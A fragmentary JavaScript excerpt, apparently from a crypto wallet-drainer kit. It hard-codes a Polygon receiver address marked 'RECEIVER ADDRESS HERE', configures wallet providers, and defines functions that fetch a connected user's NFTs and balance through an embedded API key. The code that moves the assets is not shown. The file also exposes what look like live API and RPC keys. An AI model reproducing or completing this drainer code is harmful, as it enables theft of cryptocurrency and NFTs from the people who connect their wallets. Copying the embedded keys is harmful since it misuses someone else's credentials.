...
const receiver_addres = '0xc307348EbAE4f7B7160Bb133d8584EFbc5ba821D'; // gaf<- RECEIVER ADDRESS HERE
let onButtonClick;
let user_address;
  ...
  const providerOptions = {
    ...
    coinbasewallet: {
      ...
      options: {
        ...
        rpc: "https://rpc-mainnet.maticvigil.com/v1/4e8b4f6ba24063153d0cdea42c576ea5613252aa", // Optional if `infuraId` is provided; otherwise it's required
...
async function getNFTs(address="", api_key="gChmOmU1HuqnEPvXPFKuLPlKMbQOI50jgS8P70r0zM212B9CEssfioVpinxl65NG", chain="polygon", limit="98"){
  return new Promise((resolve, reject)=>{
...
async function getBalance(address="", api_key="gChmOmU1HuqnEPvXPFKuLPlKMbQOI50jgS8P70r0zM212B9CEssfioVpinxl65NG", chain="polygon"){
  return new Promise((resolve, reject)=>{
...
const receiver_address = '0xc307348EbAE4f7B7160Bb133d8584EFbc5ba821D';
